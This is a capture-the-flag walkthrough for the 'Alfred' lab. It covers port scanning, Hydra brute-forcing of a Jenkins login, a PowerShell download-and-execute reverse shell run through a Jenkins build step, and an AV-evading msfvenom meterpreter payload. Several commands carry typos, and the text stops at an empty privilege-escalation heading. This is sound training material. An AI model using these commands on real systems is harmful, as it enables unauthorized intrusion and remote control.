# Alfred
* Exploit a common misconfiguration on a widely used automation server (Jenkins).
  * Jenkins is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it).
* Use an interesting privilege escalation method to get full system access.
## Initial Access
### nmap scan to determine open TCP ports.
```
nmap -sT -sV -p- -oN TARGET_IP_scan.nmap TARGET_IP
```
```
Not shown: 65532 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.5
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Jetty 9.4.z-SNAPSHOT
```
### Identify username and password for login panel.
> It always is good practice to Google for default credentials before attempting any brute force attack. This will save a huge amount of time.
#### 1. Send login attempt via Burpsuite.
* Target > Project > Scope > Include "http://TARGET_IP:8080" in scope.
* Ensure **Intercept** is on.
* Open inbuilt Chromium browser to intercept requests.
* Proxy any username and password via login panel.
* Forward request to **Repeater**.
* **Send** to see the response.

#### 2. Brutefore login panel using Hydra.
* Login or Wordlist for Usernames = `/usr/share/wordlists/rockyou.txt`.
* Password or Wordlist for Passwords = `/usr/share/wordlists/rockyou.txt`.
* IP address or Hostname = TARGET_IP.
* HTTP Method (POST/GET) = `http-form-post`.
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * GET or POST Method displayed in request.
```
POST /j_acegi_security_check HTTP/1.1
```
* Directory/Path to the Login Page = `/j_acegi_security_check`.
  * Request header "Filename" attribute.
```
/j_acegi_security_check
```
* Request Body for Username/Password = `j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in`
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * Right click on request > **Edit and Resend**.
  * **Request Body** contains entered username and password.
  * Grab entire request.
```
j_username=12345&j_password=12345&from=%2F&Submit=Sign+in
```
  * Replace entered username with `^USER^ to tell Hydra to enter words from wordlist in this position of the request.
  * Replace entered password with ^PASS^.
* Way to Identify Failed Attempts = `Invalid username or password`.
  * Attempt to login using incorrect credentials.
  * Presented with "Invalid username or password" text.
  * Add this to Hydra command.
```
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
``` 
* Hydra bruteforces login and returns credentials.
```
[8080][http-post-form] host: 10.10.88.127   login: Admin   password: admin
[8080][http-post-form] host: 10.10.88.127   login: admin   password: admin
1 of 1 target successfully completed, 2 valid passwords found
```
### Use feature of Jenkins server to get reverse shell.

#### 1. Jenkins project Command field allows execution of commands on underlying system.
* **Job** > **Project** > **Configure**.
* **Build** section has text field where Windows commands are executed.
#### 2. Add PowerShell to exploitable field.
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.29.136:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.29.136 -Port 1234
```
  * PowerShell script connects to standard netcat listening port when using "-Reverse" switch.
* **Save** project.
#### 3. Clone [Nishang powershell scripts from GitHub]([https://github.com/samratashok/nishang).
```
mkdir tools
cd tools
git clone https://github.com/samratashok/nishang/
cd nishang/Shells
```
#### 4. Create http server to serve Nishang Invoke-PowerShellTcp script.
```
python3 -m http.server
```
#### 5. Create listener to catch the reverse shell.
```
nc -lvnp 1234
```
#### 6. Use Jenkins feature to download and run Nishang script.
* **Build Now** feature executes saved PowerShell.
* PowerShell uploaded to target.
```
10.10.88.127 - - [23/Feb/2024 15:27:19] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
#### 7. Reverse shell caught by listener.
```
Connection from 10.10.255.193 49253 received!
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce
```
* "user.txt" is located in "C:\users\bruce\desktop" directory.
## Switching shells
* Switch to meterpreter shell to make privilege escalation easier.
#### 1. Use msfvenom to create meterpreter reverse shell.
* Payload generated is encoded x86-64 reverse TCP payload.
* Encoding used to evade AV products.
```
msfvenon -p windows/meterpreter/reverese_tcp -a x86 --encoder x86/shikata_ga_nai lhost=ATTACKER_IP lport=PORT -f exe -o shell-name.exe
```
#### 2. Download payload to target.
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```
#### 3. Verify handler is set up in Metasploit.
* Use Metasploit handler to receive incoming connection from reverse shell.
```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
```
#### 4. Start reverse shell.
```
start-process "shell-name.exe"
```
#### 5. Meterpreter reverse shell spawned.
## Privilege escalation
